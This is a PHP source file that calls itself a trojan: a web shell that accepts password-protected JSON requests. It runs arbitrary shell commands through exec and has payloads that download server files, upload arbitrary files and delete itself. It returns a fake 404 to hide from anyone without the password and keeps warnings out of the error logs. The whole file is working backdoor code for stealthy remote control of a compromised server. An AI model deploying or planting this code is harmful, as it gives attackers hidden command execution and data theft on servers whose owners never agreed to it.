<?php

# Tested on PHP 5.4.45 on Debian Wheezy.
#
# To test this trojan locally, run the following in the directory containing 
# this file:
#   php -S localhost:<port>

# TODO: Change this password. Don't leave the default!
define('PASSWORD', 'the-password');

# Override the default error handling to:
#   1. Bludgeon PHP `throw`-ing rather than logging errors
#   2. Keep noise out of the error logs
set_error_handler('warning_handler', E_WARNING);
function warning_handler($errno, $errstr) { 
    throw new ErrorException($errstr);
}

# get the POSTed JSON input
$post = json_decode(file_get_contents('php://input'), true);
$cwd  = ($post['cwd'] !== '') ? $post['cwd'] : getcwd();

# feign non-existence if the authentication is invalid
if (!isset($post['auth']) || $post['auth'] !== PASSWORD) {
    header('HTTP/1.0 404 Not Found');
    die();
}

# return JSON to the client
header('content-type: application/json');

# if `cmd` is a trojan payload, execute it
if (function_exists($post['cmd'])) {
    $post['cmd']($cwd, $post['args']);
}

# otherwise, execute a shell command
else {
    $output = [];

    # execute the command
    $cmd = "cd $cwd; {$post['cmd']} 2>&1; pwd";
    exec($cmd, $output);
    $cwd = array_pop($output);

    $response = [
        'stdout' => $output,
        'stderr' => [],
        'cwd'    => $cwd,
    ];

    die(json_encode($response));
}


# File-download payload
function payload_download ($cwd, $args) {

    # cd to the trojan's cwd 
    chdir($cwd);

    # open the file as binary, and base64-encode its contents
    try {
        $stdout = base64_encode(file_get_contents($args['file']));
        $stderr = [];
    }
    
    # notify the client on failure
    catch (ErrorException $e) {
        $stdout = [];
        $stderr = [ 'Could not download file.', $e->getMessage() ];
    }

    die(json_encode([
        'stdout' => $stdout,
        'stderr' => $stderr,
        'cwd'    => $cwd,
    ]));
}

# File-upload payload
function payload_upload ($cwd, $args) {

    # cd to the trojan's cwd 
    chdir($cwd);

    # base64-decode the uploaded bytes, and write them to a file
    try {
        file_put_contents( $args['dst'], base64_decode($args['data']));
        $stderr = [];
        $stdout = [ "File saved to {$args['dst']}." ];
    }
    
    # notify the client on failure
    catch (ErrorException $e) {
        $stdout = [];
        $stderr = [ 'Could not save file.', $e->getMessage() ];
    }

    die(json_encode([
        'stdout' => $stdout,
        'stderr' => $stderr,
        'cwd'    => $cwd,
    ]));
}

# Trojan autodestruct
function payload_autodestruct ($cwd, $args) {

    # attempt to delete the trojan
    try {

        unlink(__FILE__);
        $stdout = [ 'File ' . __FILE__ . ' has autodestructed.' ];
        $stderr = [];
    }
    
    # notify the client on failure
    catch (ErrorException $e) {
        $stdout = [];
        $stderr = [ 'File ' . __FILE__ . ' could not autodestruct.'];
    }

    die(json_encode([
        'stdout' => [ 'Instructed ' . __FILE__ . ' to autodestruct.' ],
        'stderr' => [],
        'cwd'    => $cwd,
    ]));
}
